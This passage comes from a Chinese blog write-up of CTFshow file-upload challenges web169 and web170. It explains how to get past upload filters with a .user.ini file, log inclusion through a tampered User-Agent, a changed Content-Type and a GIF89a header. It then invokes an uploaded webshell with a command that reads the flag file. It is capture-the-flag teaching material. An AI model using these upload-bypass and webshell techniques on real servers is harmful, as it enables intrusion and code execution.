<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688900322936-79959956-1bac-4480-9a63-9177fc0a01a7.png" alt="image.png"><br>上传之后访问即可。但是注意，点击下载之后跳转链接是错误的。正确的连接<code>/upload/jichumiansha.php</code><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688900506632-4a8dd9e3-991c-4233-af39-1da09d8574f0.png" alt="image.png"></p>
<h1 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h1><h3 id="日志包含-1"><a href="#日志包含-1" class="headerlink" title="日志包含"></a>日志包含</h3><p>还是之前的.user.ini。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688900849727-63a7d2c3-edd5-40e0-a16d-129958b252d1.png" alt="20210423141358274.png"><br>contenttype要修改成如图的样式。<br>然后再传一个php文件。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688901084652-94e75a15-5c22-4c8a-bafa-86907f8ffa0d.png" alt="image.png"><br>注意图中UA，文件名，文件种类。<br>然后就是访问1.php了。<br><code>upload/1.php?2=tac ../f*</code></p>
<h1 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h1><h3 id="user-ini-GIF89A文件头"><a href="#user-ini-GIF89A文件头" class="headerlink" title=".user.ini GIF89A文件头"></a>.user.ini GIF89A文件头</h3><p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688901395850-cfc84364-443e-406e-bd88-c2c5572653f1.png" alt="image.png"><br>加个文件头即可。</p>

                        </article>
                    </div>


                    <div class="fleet-content-body-footer mt-16">
                        <!--翻页器-->
                        <div class="flex-row flex w-full justify-between">
                            <div class="fleet-content-body-footer-left">
                                
                                    <div><a href="/posts/ecf1a26a/"
                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
                                                 xmlns="http://www.w3.org/2000/svg"
                                                 width="24" height="24" viewBox="0 0 24 24">
                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
                                            </svg>
                                            <div class="flex flex-col items-start"><span
                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
                                                <span>从零开始的智慧树倍速油猴脚本（一）</span></div>
                                        </a></div>
                                
                            </div>
                            <div class="fleet-content-body-footer-right">
                                
                                    <div><a href="/posts/8b1fb998/"
                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
                                            <div class="flex flex-col items-end"><span
                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
                                                <span>web106-web131php特性篇（二）</span></div>
                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
                                                 xmlns="http://www.w3.org/2000/svg"
                                                 width="24" height="24" viewBox="0 0 24 24">
                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
                                            </svg>
                                        </a></div>

                                
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </div>
    </div>
</div>

    <!--    嵌套位置结束-->
    <!--<h3>categories</h3>-->
    <!--<ul>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/categories/CTF/">-->
    <!--                CTF-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/categories/CTF/JavaSec/">-->
    <!--                JavaSec-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/categories/Python/">-->
    <!--                Python-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--</ul>-->

    <!--<h3>tags</h3>-->
    <!--<ul>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">-->
    <!--                Java反序列化-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/CC%E9%93%BE/">-->
    <!--                CC链-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/WriteUp/">-->
    <!--                WriteUp-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/CTFshow0-1/">-->
    <!--                CTFshow0-1-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/CISCN/">-->
    <!--                CISCN-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
    <!--                脚本-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Tampermonkey/">-->
    <!--                Tampermonkey-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Shortcut/">-->
    <!--                Shortcut-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
    <!--                语雀-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--</ul>-->
</div>
<!--返回顶部按钮-->
<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
<!--加个渐变，但还是有点丑-->
<!-- TODO 换个更好的方案-->
<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
</div>

<footer class="footer p-10 bg-neutral text-neutral-content">
    <aside>
        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
        © 2020-2024 Lupas by Natro92
        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
    </aside>
    <nav>
        <header class="footer-title">Social</header>
        <!--<div class="grid grid-flow-col gap-4">-->
        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
        <!--</div>-->
    </nav>
</footer>
</body>

</html>


